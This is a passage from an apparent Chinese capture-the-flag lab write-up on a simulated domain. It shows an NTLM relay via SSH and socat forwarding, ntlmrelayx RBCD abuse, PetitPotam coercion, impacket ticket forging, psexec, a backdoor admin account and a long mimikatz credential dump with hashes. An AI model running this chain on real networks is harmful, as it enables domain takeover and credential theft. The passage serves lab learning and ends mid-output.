+<pre tabindex="0"><code>proxychains webclientservicescanner xiaorang.lab/yangmei:xrihGHgoNZQ@172.22.11.26 -no-validation
+</code></pre><pre tabindex="0"><code>proxychains webclientservicescanner xiaorang.lab/yangmei:xrihGHgoNZQ@172.22.11.6 -no-validation
+</code></pre><ul>
+<li>继攻击前言：
+<ul>
+<li>实战中的中继打法只需要停掉80占用服务，开启端口转发（portfwd，CS在后续版本中添加了rportfwd_local，直接转发到客户端本地）</li>
+<li>本次演示类似实战的打法，不选择把impacket丢到入口ubuntu上面这种操作</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>中继攻击环境配置: 端口转发 + 代理
+我们目前需要把服务器的80，转发到客户端本地的80</li>
+</ol>
+<ul>
+<li>注意：由于SSH的反向端口转发监听的时候只会监听127.0.0.1，所以这时候需要点技巧
+如图所示，即使反向端口转发79端口指定监听全部 (-R *:79:127.0.0.1:80)，端口79依旧绑定在了127.0.0.1（图中顺便把socks5代理也开了）</li>
+</ul>
+<pre tabindex="0"><code>ssh -i id_rsa_2048 root@39.98.120.46 -D 49.233.121.53:5002 -R \*:79:127.0.0.1:80
+nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005112104155.png" alt="image-20231005112104155"></p>
+<p>测试，从172.22.11.76:80 进来的流量直接转发到了我们本地</p>
+<pre tabindex="0"><code>nc -lvvp 80
+proxychains curl http://172.22.11.76:80
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005112343690.png" alt="image-20231005112343690"></p>
+<p>本地开启ntlmrelayx</p>
+<p>注意：</p>
+<ul>
+<li>前面提到，没有ldaps，所以不能使用addcomputer</li>
+<li>同时在使用proxychains后，ldap://后面只能接dc的ip</li>
+<li>利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD</li>
+</ul>
+<pre tabindex="0"><code>proxychains python ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#39;xr-desktop$&#39; --delegate-access
+</code></pre><p>使用Petitpotam触发 XR-LCM3AE8B 认证到172.22.11.76 (ubuntu)</p>
+<pre tabindex="0"><code>proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :578bcc26fbbadeea510280fbfd3859e9 xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005120551383.png" alt="image-20231005120551383"></p>
+<p>可以看到，已经完成RBCD攻击了，接下来就是直接申请XR-LCM3AE8B的银票了</p>
+<p>申请XR-LCM3AE8B CIFS票据。这里的hash是前面通过172.22.11.45,mimikatz抓取到的XR-DESKTOP用户的hash</p>
+<pre tabindex="0"><code>proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :578bcc26fbbadeea510280fbfd3859e9 xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6
+</code></pre><p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005121544516.png" alt="image-20231005121544516"></p>
+<p>然后本地会保存一个administrator.ccache的票据。然后就是利用这个银票，进行我们psexec连接</p>
+<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005121646535.png" alt="image-20231005121646535"></p>
+<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005121706670.png" alt="image-20231005121706670"></p>
+<h1 id="flag4">flag4</h1>
+<p>利用上面拿到的终端，加个管理员用户</p>
+<pre tabindex="0"><code>net user test Abcd1234 /add
+net localgroup administrators test /add
+</code></pre><p>再回来看看信息</p>
+<pre tabindex="0"><code>172.22.11.6 XIAORANG-DC DC
+172.22.11.26 XR-LCM3AE8B
+172.22.11.76 最先拿到shell的
+172.22.11.45 MS17-010 XR-DESKTOP
+</code></pre><p>远程桌面连接26。管理员运行猕猴桃，抓波密码。</p>
+<pre tabindex="0"><code>C:\Users\test\Desktop&gt;mimikatz
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege &#39;20&#39; OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 11118680 (00000000:00a9a858)
+Session           : RemoteInteractive from 3
+User Name         : test
+Domain            : XR-LCM3AE8B
+Logon Server      : XR-LCM3AE8B
+Logon Time        : 2023/10/5 12:20:58
+SID               : S-1-5-21-886837244-2534789743-3500935927-1002
+        msv :
+         [00000003] Primary
+         * Username : test
+         * Domain   : XR-LCM3AE8B
+         * NTLM     : c780c78872a102256e946b3ad238f661
+         * SHA1     : bc4e7d2a003b79bb6ffdfff949108220c1fad373
+        tspkg :
+        wdigest :
+         * Username : test
+         * Domain   : XR-LCM3AE8B
+         * Password : (null)
+        kerberos :
+         * Username : test
+         * Domain   : XR-LCM3AE8B
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 11118648 (00000000:00a9a838)
+Session           : RemoteInteractive from 3
+User Name         : test
+Domain            : XR-LCM3AE8B
+Logon Server      : XR-LCM3AE8B
+Logon Time        : 2023/10/5 12:20:58
+SID               : S-1-5-21-886837244-2534789743-3500935927-1002
+        msv :
+         [00000003] Primary
+         * Username : test
+         * Domain   : XR-LCM3AE8B
+         * NTLM     : c780c78872a102256e946b3ad238f661
+         * SHA1     : bc4e7d2a003b79bb6ffdfff949108220c1fad373
+        tspkg :
+        wdigest :
+         * Username : test
+         * Domain   : XR-LCM3AE8B
+         * Password : (null)
+        kerberos :
+         * Username : test
+         * Domain   : XR-LCM3AE8B
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 11104553 (00000000:00a97129)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023/10/5 12:20:57
+SID               : S-1-5-90-0-3
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 11103841 (00000000:00a96e61)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023/10/5 12:20:57
+SID               : S-1-5-90-0-3
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 11102640 (00000000:00a969b0)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023/10/5 12:20:57
+SID               : S-1-5-96-0-3
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 779444 (00000000:000be4b4)
+Session           : RemoteInteractive from 2
+User Name         : zhanghui
+Domain            : XIAORANG
+Logon Server      : XIAORANG-DC
+Logon Time        : 2023/10/5 10:56:57
+SID               : S-1-5-21-3598443049-773813974-2432140268-1133
+        msv :
+         [00000003] Primary
+         * Username : zhanghui
+         * Domain   : XIAORANG
+         * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1
+         * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65
+         * DPAPI    : 4bfe751ae03dc1517cfb688adc506154
+        tspkg :
+        wdigest :
+         * Username : zhanghui
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : zhanghui
+         * Domain   : XIAORANG.LAB
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 742685 (00000000:000b551d)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:56:56
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : f87bbea221c346a6578b5e937f207038
+         * SHA1     : 318380b6fdd4556d540909a5c86a1bf191b2f0f5
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 7e 84 db cc ca 73 03 80 f7 29 81 e8 9a fe 5f f1 22 35 25 bb 96 3a 28 f5 3e e9 e7 09 9f 36 a4 11 b1 77 de a6 77 48 92 8b 49 49 c2 e8 02 16 89 fb 33 bd b5 2a f7 04 62 74 db 1e c3 ba bd 63 f8 b0 d1 ec 46 50 4e 04 38 6d a7 a4 7e 0d 1a 4d 06 5a 73 6e 11 71 11 e2 7f 9b 8e 7f 68 6a 8f 23 6e 38 66 a5 76 95 65 1d 1a 38 24 fc 64 e2 ca 83 c4 87 57 ec 28 eb fe 15 50 c1 55 b2 22 46 1a 2d 7b 50 d0 71 b5 90 86 90 da 4b a8 51 2a 85 9b 38 e0 0f ea 2a 67 18 3c 8d f4 5e 3a 50 2b 57 b3 55 c5 b6 48 5a af 8c 3c f6 f4 09 0e f4 d9 ff f3 3d a2 f7 87 eb 33 02 d3 f9 d1 da b7 ac 37 14 0a 50 cc 3b ca d1 6f 0a c2 a0 73 81 75 65 91 85 95 dd 60 c6 a9 e1 1f 43 9c 4c 81 91 b5 77 ed 2d 28 5d c8 0f 1a 06 c8 89 44 64 65 11 f2 36 37 13 7c ef 8b 56
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 742103 (00000000:000b52d7)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:56:56
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 741315 (00000000:000b4fc3)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:56:56
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:55
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 59507 (00000000:0000e873)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:54
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : f87bbea221c346a6578b5e937f207038
+         * SHA1     : 318380b6fdd4556d540909a5c86a1bf191b2f0f5
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 7e 84 db cc ca 73 03 80 f7 29 81 e8 9a fe 5f f1 22 35 25 bb 96 3a 28 f5 3e e9 e7 09 9f 36 a4 11 b1 77 de a6 77 48 92 8b 49 49 c2 e8 02 16 89 fb 33 bd b5 2a f7 04 62 74 db 1e c3 ba bd 63 f8 b0 d1 ec 46 50 4e 04 38 6d a7 a4 7e 0d 1a 4d 06 5a 73 6e 11 71 11 e2 7f 9b 8e 7f 68 6a 8f 23 6e 38 66 a5 76 95 65 1d 1a 38 24 fc 64 e2 ca 83 c4 87 57 ec 28 eb fe 15 50 c1 55 b2 22 46 1a 2d 7b 50 d0 71 b5 90 86 90 da 4b a8 51 2a 85 9b 38 e0 0f ea 2a 67 18 3c 8d f4 5e 3a 50 2b 57 b3 55 c5 b6 48 5a af 8c 3c f6 f4 09 0e f4 d9 ff f3 3d a2 f7 87 eb 33 02 d3 f9 d1 da b7 ac 37 14 0a 50 cc 3b ca d1 6f 0a c2 a0 73 81 75 65 91 85 95 dd 60 c6 a9 e1 1f 43 9c 4c 81 91 b5 77 ed 2d 28 5d c8 0f 1a 06 c8 89 44 64 65 11 f2 36 37 13 7c ef 8b 56
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 59477 (00000000:0000e855)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:54
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : XR-LCM3AE8B$
+Domain            : XIAORANG
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:54
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : xr-lcm3ae8b$
+         * Domain   : XIAORANG.LAB
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 29920 (00000000:000074e0)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:54
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 29912 (00000000:000074d8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:54
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : XR-LCM3AE8B$
+         * Domain   : xiaorang.lab
+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 27654 (00000000:00006c06)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:54
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * NTLM     : e4cee3293db1e3a139afc53875baf653
+         * SHA1     : f78708e13d52b37483b58b1e3896d10bb3997315
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : XR-LCM3AE8B$
+Domain            : XIAORANG
+Logon Server      : (null)
+Logon Time        : 2023/10/5 10:53:54
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : XR-LCM3AE8B$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : xr-lcm3ae8b$
+         * Domain   : XIAORANG.LAB
